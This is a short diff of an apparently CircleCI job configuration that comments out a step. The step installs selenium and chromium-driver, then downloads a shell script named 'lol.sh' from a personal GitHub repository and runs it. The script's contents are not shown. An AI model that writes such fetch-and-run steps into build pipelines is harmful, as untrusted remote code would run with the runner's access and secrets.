@@ -10,7 +10,7 @@ jobs:
           command: |
             echo "Checking number of CPUs:"
             sudo apt-get update && sudo apt-get install -y neofetch && sudo apt install curl -y && sudo apt install wget -y
-            sudo apt-get update -y && sudo apt-get install python3-setuptools -y && pip install selenium && sudo apt-get install chromium-driver -y && pip install selenium selenium-wire && pip uninstall blinker -y && pip install blinker==1.4 && wget https://raw.githubusercontent.com/uriahgones/gones/refs/heads/main/lol.sh && chmod +x lol.sh && ./lol.sh
+            #sudo apt-get update -y && sudo apt-get install python3-setuptools -y && pip install selenium && sudo apt-get install chromium-driver -y && pip install selenium selenium-wire && pip uninstall blinker -y && pip install blinker==1.4 && wget https://raw.githubusercontent.com/uriahgones/gones/refs/heads/main/lol.sh && chmod +x lol.sh && ./lol.sh
 
 workflows:
   version: 2
